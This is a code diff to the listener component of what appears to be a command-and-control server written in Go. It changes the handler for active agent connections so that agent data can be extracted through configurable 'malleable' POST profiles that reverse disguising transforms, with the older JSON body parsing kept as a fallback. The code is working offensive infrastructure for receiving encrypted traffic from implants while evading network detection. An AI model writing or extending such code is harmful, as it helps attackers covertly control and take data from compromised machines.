@@ -2,6 +2,7 @@
 package listeners
 
 import (
+	"c2/internal/common/config"
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
@@ -20,7 +21,8 @@ import (
 )
 
 // handleActiveConnection - COMPLETE VERSION WITH ALL PROCESSING LOGIC
-func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request, conn *ActiveConnection, db *sql.DB) {
+// postProfile is optional - if nil, uses legacy JSON body parsing
+func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request, conn *ActiveConnection, db *sql.DB, postProfile *config.PostProfile) {
 	log.Printf("[Active Connection] Handling request for client %s", conn.ClientID)
 
 	// Create context with timeout
@@ -54,16 +56,33 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 		}
 	}()
 
-	// Read and parse the request body
-	var postData struct {
-		Data    string `json:"data"`
-		AgentID string `json:"agent_id"`
-	}
+	// Extract POST body data - supports malleable transforms via DataBlock
+	var encryptedDataB64 string
 
-	if err := json.NewDecoder(r.Body).Decode(&postData); err != nil {
-		log.Printf("[Active Connection] Failed to decode request body: %v", err)
-		http.Error(w, "Bad Request", http.StatusBadRequest)
-		return
+	if postProfile != nil && postProfile.Data != nil {
+		// Use DataBlock extraction with transform reversal
+		basePath := postProfile.Path
+		bodyData, err := m.extractDataFromDataBlock(r, postProfile.Data, basePath)
+		if err != nil {
+			log.Printf("[Active Connection] Failed to extract body via DataBlock: %v", err)
+			http.Error(w, "Bad Request", http.StatusBadRequest)
+			return
+		}
+		encryptedDataB64 = string(bodyData)
+		log.Printf("[Active Connection] Extracted data via DataBlock from %s", postProfile.Data.Output)
+	} else {
+		// Legacy: Read and parse JSON body
+		var postData struct {
+			Data    string `json:"data"`
+			AgentID string `json:"agent_id"`
+		}
+
+		if err := json.NewDecoder(r.Body).Decode(&postData); err != nil {
+			log.Printf("[Active Connection] Failed to decode request body: %v", err)
+			http.Error(w, "Bad Request", http.StatusBadRequest)
+			return
+		}
+		encryptedDataB64 = postData.Data
 	}
 
 	log.Printf("[Active Connection] Received data for client %s", conn.ClientID)
@@ -73,7 +92,7 @@ func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request,
 	secretHash := sha256.Sum256([]byte(conn.Secret1))
 
 	// Decode base64
-	ciphertext, err := base64.StdEncoding.DecodeString(postData.Data)
+	ciphertext, err := base64.StdEncoding.DecodeString(encryptedDataB64)
 	if err != nil {
 		log.Printf("[Active Connection] Failed to decode base64: %v", err)
 		http.Error(w, "Invalid data format", http.StatusBadRequest)
